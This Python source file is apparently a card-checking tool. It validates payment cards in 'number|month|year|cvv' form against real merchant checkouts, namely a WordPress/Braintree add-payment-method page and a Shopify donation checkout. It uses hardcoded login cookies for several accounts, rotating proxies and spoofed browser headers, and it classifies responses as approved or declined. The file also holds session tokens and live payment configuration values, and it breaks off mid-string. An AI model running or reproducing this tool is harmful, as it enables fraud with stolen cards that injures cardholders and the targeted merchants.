import requests
import re
import user_agent
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def notauto(ccx):
  proxy = get_proxy()
  print(proxy)
  from user_agent import generate_user_agent
  user = user_agent.generate_user_agent()
  import requests
  ccx = ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:  # Mo3gza
    yy = yy.split("20")[1]
  with open('fileb3.txt', 'r') as file:
    first_line = file.readline()
    last_used_times = {}
  while True:
    lines = '''khushi80%7C1745040836%7Chitwg4oNGarZLryZ8Erho2E6qecl1kLkUdJ5S4ByvG5%7Cc6c9441b532265341cee0dfe213605d8a94211676aaeaef83313c3af524950e3
jhonsmith56%7C1745043318%7CRjafOSRqkA7hndNCSuNt6Pmia4SDCVkvCGjwf9f9no9%7C9fac668e78566abcaca5ddad27338aa6cc5d9047ec880f4deddc4965a3299dfd
rahul900%7C1745067383%7CqqUyg5PpWmakfhY4ifxaAnyBGtkyqS6vU6UOZzxH0Lk%7C27ac02d7ae39b2258da3826b03ab3a0adbbde7f34304ef76d56fe6f67c3939d1
rahul999%7C1745067630%7Cn0E8dDIQRcD23SbMVlLmT8aZh1tlFO1cODUi9jPwFQK%7Ce69b97f60aeca2b675f958a0c8ec0ef1cddc2b1122f4bec93e36c14e34f6bf6f'''
    lines = lines.strip().split('\n')
    random_line_number = random.randint(0, len(lines) - 1)
    big = lines[random_line_number]
    current_time = time.time()
    if big in last_used_times:
    	time_since_last_use = current_time - last_used_times[big]
    	if time_since_last_use < 10:
    		continue    
    if big == first_line:
      pass
    else:
      break
  with open('fileb3.txt', 'w') as file:
    file.write(big)
    print(big)
  cookies = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-04-05%2005%3A03%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-04-05%2005%3A03%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
    '_gcl_au': '1.1.1819597955.1743831181',
    '_tt_enable_cookie': '1',
    '_ttp': '01JR270ADYY7C4NGXWF07MJZJD_.tt.1',
    'groundhogg-lead-source': 'https://lovedagainmedia.com/my-account/add-payment-method',
    'groundhogg-tracking': 'Zk83QVlFUE42S1ZlY1hKc0RFMGZDWHJUOUNYUnZHRFJBenc2OU9ieUpCcz0%3D',
    'breeze_folder_name': '3200521161cb8df9c497c844012f06c82ff68484',
    'wordpress_logged_in_ef622a6d6df3290e271fd50a256d6fba': big,
    'mcfw-wp-user-cookie': 'NjY5ODUxfDB8NjN8NjcyX2E5MGJlM2NhOTI2Y2RjOGFlNmI4MGQ5OWFkY2Y4YzJiMGI0MDY1MTYwY2UzMWVkM2RiMWQ1NDJlYzA1ZTdhOGU%3D',
    'wfwaf-authcookie-a40366314e68c30ea30dae8bbdc22a9d': '669851%7Cother%7Cread%7C0b9f27d3c717fba3db9c0fecf1cce472fee36be9ed94ad709c00aebe132044a4',
    'tk_ai': 'OWLUABG2DFAjtgCM8Fku0wFM',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    'sbjs_session': 'pgs%3D25%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fpayment-methods',
    'tk_qs': '',
    'groundhogg-page-visits': '[["/my-account/payment-methods",[[1743831242,1],[1743831248,1],[1743831335,1],[1743831476,1],[1743831764,1]]],["/my-account/add-payment-method",[[1743831678,1],[1743831691,1],[1743831735,1],[1743831746,1],[1743831757,1]]],["/my-account/edit-address",[[1743831299,1],[1743831328,1]]],["/my-account/edit-address/billing",[[1743831306,1]]]]',
}

  headers = {
    'authority': 'lovedagainmedia.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://lovedagainmedia.com/my-account/payment-methods',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}

  response = requests.get('https://lovedagainmedia.com/my-account/add-payment-method', cookies=cookies, headers=headers, proxies=proxy)
  add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
  enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
  dec = base64.b64decode(enc).decode('utf-8')
  au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
  print(au)
  response = requests.get("https://ipinfo.io/json", proxies=proxy)
  print(response.text)
  

  headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}

  json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'ee98a83b-782c-4e39-9a7f-ca144ea38d36',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'Near Walmart 45',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

  response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxy)
  tok = response.json()['data']['tokenizeCreditCard']['token']
  print(tok)

  cookies = {
    '_gcl_au': '1.1.1819597955.1743831181',
    '_tt_enable_cookie': '1',
    '_ttp': '01JR270ADYY7C4NGXWF07MJZJD_.tt.1',
    'groundhogg-lead-source': 'https://lovedagainmedia.com/my-account/add-payment-method',
    'groundhogg-tracking': 'Zk83QVlFUE42S1ZlY1hKc0RFMGZDWHJUOUNYUnZHRFJBenc2OU9ieUpCcz0%3D',
    'breeze_folder_name': '3200521161cb8df9c497c844012f06c82ff68484',
    'wordpress_logged_in_ef622a6d6df3290e271fd50a256d6fba': big,
    'mcfw-wp-user-cookie': 'NjY5ODUxfDB8NjN8NjcyX2E5MGJlM2NhOTI2Y2RjOGFlNmI4MGQ5OWFkY2Y4YzJiMGI0MDY1MTYwY2UzMWVkM2RiMWQ1NDJlYzA1ZTdhOGU%3D',
    'tk_ai': 'OWLUABG2DFAjtgCM8Fku0wFM',
    'wfwaf-authcookie-a40366314e68c30ea30dae8bbdc22a9d': '669851%7Cother%7Cread%7Ce7f058eac4f1febfc32d855a3ba1bd66c0ec823be4a8ab53de38862d0464ce34',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-04-05%2011%3A46%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
    'sbjs_first_add': 'fd%3D2025-04-05%2011%3A46%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D26%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
    'tk_qs': '',
    'groundhogg-page-visits': '[["/my-account/add-payment-method",[[1743855178,1],[1743855365,1],[1743855398,1],[1743855615,1],[1743855643,1]]],["/my-account/payment-methods",[[1743853923,1]]]]',
}

  headers = {
    'authority': 'lovedagainmedia.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',    
    'origin': 'https://lovedagainmedia.com',
    'referer': 'https://lovedagainmedia.com/my-account/add-payment-method',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}

  data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"cadb4f495bb4209541dee0591e8f5286","fraud_merchant_id":null,"correlation_id":"9a4b955a-bf6d-42c4-91bd-a3baf6e8"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/rjxzjtn49jmc2mm3/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/rjxzjtn49jmc2mm3"},"merchantId":"rjxzjtn49jmc2mm3","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"rjxzjtn49jmc2mm3","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Visa","MasterCard","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Loved Again Media","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDM5NDE3NjYsImp0aSI6ImE0NDI5YmM2LWUyODEtNDM2Yi05ZDk5LTg2ODVmNDRmOTFkYiIsInN1YiI6InJqeHpqdG40OWptYzJtbTMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InJqeHpqdG40OWptYzJtbTMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.OBvNRuBD_Cdml0RZNSWhIrYD-o-q1NUcV2p-3-lp98yYr7yDzyNFGu8XoQwaBRm5PRmnFvItn1236GDTdnG08g","paypalClientId":"AdwNjZe-KdxfMpASssaiCHu_6md6KiXqwiBOmPCfx2Jbocb_HBB8aPEN1kWkrvJN_6vvbjpYaCL89gU1","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3336777698625192868","accessToken":"access_token$production$rjxzjtn49jmc2mm3$501425b5cb865ff22144901bb5a31794","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"Loved Again Media","clientId":"AdwNjZe-KdxfMpASssaiCHu_6md6KiXqwiBOmPCfx2Jbocb_HBB8aPEN1kWkrvJN_6vvbjpYaCL89gU1","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"lovedagainmedia_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method',
    'woocommerce_add_payment_method': '1',
    'apbct_email_id__elementor_form': '',
    'ct_bot_detector_event_token': 'e3d4f46686dd39e8bb21f37634b4eba13178687a60669e79ff51419251b31e29',
    'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJicmFpbnRyZWVfY2Nfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSBicmFpbnRyZWVfY2NfM2RzX25vbmNlX2tleSBicmFpbnRyZWVfY2NfY29uZmlnX2RhdGEgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIGFwYmN0X2VtYWlsX2lkX19lbGVtZW50b3JfZm9ybSBjdF9ib3RfZGV0ZWN0b3JfZXZlbnRfdG9rZW4gY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZCIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjEwfX0=',
    'ct_no_cookie_hidden_field': '_ct_no_cookie_data_eyJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiY3RfaGFzX3Njcm9sbGVkIjp0cnVlLCJjdF9jb29raWVzX3R5cGUiOiJub25lIiwiYXBiY3RfaGVhZGxlc3MiOmZhbHNlLCJhcGJjdF92aXNpYmxlX2ZpZWxkcyI6IntcInZpc2libGVfZmllbGRzXCI6XCJcIixcInZpc2libGVfZmllbGRzX2NvdW50XCI6MCxcImludmlzaWJsZV9maWVsZHNcIjpcImJyYWludHJlZV9jY19ub25jZV9rZXkgYnJhaW50cmVlX2NjX2RldmljZV9kYXRhIGJyYWludHJlZV9jY18zZHNfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19jb25maWdfZGF0YSB3b29jb21tZXJjZS1hZGQtcGF5bWVudC1tZXRob2Qtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciB3b29jb21tZXJjZV9hZGRfcGF5bWVudF9tZXRob2QgYXBiY3RfZW1haWxfaWRfX2VsZW1lbnRvcl9mb3JtIGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiBhcGJjdF92aXNpYmxlX2ZpZWxkcyBjdF9ub19jb29raWVfaGlkZGVuX2ZpZWxkXCIsXCJpbnZpc2libGVfZmllbGRzX2NvdW50XCI6MTF9IiwiY3RfZmtwX3RpbWVzdGFtcCI6MTc0Mzg1NTY2MiwiY3Rfc2NyZWVuX2luZm8iOiJ7XCJmdWxsV2lkdGhcIjozNjAsXCJmdWxsSGVpZ2h0XCI6MzA1NyxcInZpc2libGVXaWR0aFwiOjM2MCxcInZpc2libGVIZWlnaHRcIjo2NTR9IiwiY3RfY2hlY2tqcyI6IjlkZGE1Y2U2ZGIxMDBjZDg2NTQ5MDg0NWFjM2QzMmQxYWM3MGJhNjA2ZDJkMmFkNjk1OGJiODE0OTg3MzBiOTEiLCJjdF90aW1lem9uZSI6NS41LCJjdF9jaGVja2VkX2VtYWlscyI6IjAiLCJjdF9oYXNfa2V5X3VwIjoidHJ1ZSIsImN0X3BzX3RpbWVzdGFtcCI6MTc0Mzg1NTY0MSwiYXBiY3RfcGFnZV9oaXRzIjo0LCJjdF9oYXNfaW5wdXRfZm9jdXNlZCI6InRydWUiLCJjdF9wb2ludGVyX2RhdGEiOiJbXSIsImN0X2NoZWNrZWRfZW1haWxzX2V4aXN0IjoiMCIsImFwYmN0X3Nlc3Npb25faWQiOiJqbHAiLCJhcGJjdF9zZXNzaW9uX2N1cnJlbnRfcGFnZSI6Imh0dHBzOi8vbG92ZWRhZ2Fpbm1lZGlhLmNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZCIsInR5cG8iOltdLCJjb2xsZWN0aW5nX3VzZXJfYWN0aXZpdHlfZGF0YSI6eyJjbGlja3MiOjF9fQ==',
}

  response = requests.post('https://lovedagainmedia.com/my-account/add-payment-method', cookies=cookies, headers=headers, data=data, proxies=proxy)
  text = response.text
  pattern = r'Reason: (.+?)\s*</li>'
  match = re.search(pattern, text)
  if match:
    result = match.group(1)
  else:
    if 'Payment method successfully added.' in text:
      result = "1000: Approved"
    elif 'risk_threshold' in text:
      result = "Gateway Rejected: Risk Threshold"
    elif 'Please wait for 20 seconds.' in text:      
      result = 'wait for 20 seconds'
    else:
      result = "Declined"
      print('er#')
  if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'invaild postal code' in result:
     return 'Approved'
  else:
     return result
import requests,re
def Tele2(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()	
	headers = {'authority': 'wiredministries.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryvtMfMS7ihgPqCSmW','origin': 'https://wiredministries.com','referer': 'https://wiredministries.com/products/donate','sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1', 'upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',}
	data = '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="form_type"\r\n\r\nproduct\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="utf8"\r\n\r\n\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="id"\r\n\r\n6889401221181\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="quantity"\r\n\r\n1\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="add"\r\n\r\n\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="product-id"\r\n\r\n516727406653\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="section-id"\r\n\r\nproduct-template\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW--\r\n'
	response = r.post('https://wiredministries.com/cart/add', cookies=r.cookies, headers=headers, data=data)
	headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ar,en-US;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://wiredministries.com', 'priority': 'u=0, i','referer': 'https://wiredministries.com/cart','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
	data = {'updates[]': '2', 'note': '', 'checkout': 'Check out'}
	response = r.post('https://wiredministries.com/cart', headers=headers, data=data)
	headers = {'accept': 'application/json','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-type': 'application/json','origin': 'https://checkout.shopifycs.com','priority': 'u=1, i','referer': 'https://checkout.shopifycs.com/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
	json_data = {'credit_card': {'number': n,'month': mm,'year': yy,'verification_value': cvc,'name': 'Tome Annder',},'payment_session_scope': 'wiredministries.com',}
	iddd = requests.post('https://deposit.shopifycs.com/sessions', headers=headers, json=json_data).json()['id']
	headers = {'accept': 'application/json','accept-language': 'en-US','content-type': 'application/json','origin': 'https://wiredministries.com','priority': 'u=1, i','referer': 'https://wiredministries.com/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','x-checkout-one-session-token': 'MTk3c2EzTWhpb1lyeWtnaFA5QlhDc29nTjRKUzNxeEJqMkZ3QkNjVnRVT0kvVk1Gcm84ckV0VXBJTzVaY2hHaHRXak5kWWY0NGxnYW4xS2U4dE9NNmM5dkplNE1ISnd0Q29aZ1IyTWNTU2cvTURPc00yVWNUaGhoS21WQzBmRzZOOW9IZE85RHBTU3ZmR1dRVC9SWFBPVHg5MnRjMElWUDhlV1M0aVRyeHpCdzM2NTk1MkhZMkRlSEIvZ25jWm42VDZJQ0d6eitsVkxneVZQTk9GbWpQdm95bVV5LzBnb1U2cW5uYWVidG9oeHBFRktxYUl6S1RuVTJ0cVNjSjdiVnU2aUFwSjhxNTdpNVlQZUpzdCs1U2FYTmxqblN1NUtLVjVJaS0tRGh3aktjMi9yZ2V6dHdiMC0tOHV3MXExUVY4Z1hoTk5qT21URDR1dz09','x-checkout-web-build-id': iddd,'x-checkout-web-deploy-stage': 'production','x-checkout-web-server-handling': 'fast','x-checkout-web-server-rendering': 'no','x-checkout-web-source-id': 'Z2NwLWV1cm9wZS13ZXN0MTowMUo2NVlXVlhRQVI0QUtOWEM4VlBaTTJIWQ',}
	params = {'operationName': 'PollForReceipt',}
	
	json_data = {'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}analytics{checkoutCompletedEventId __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId customerOrdersCount eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId 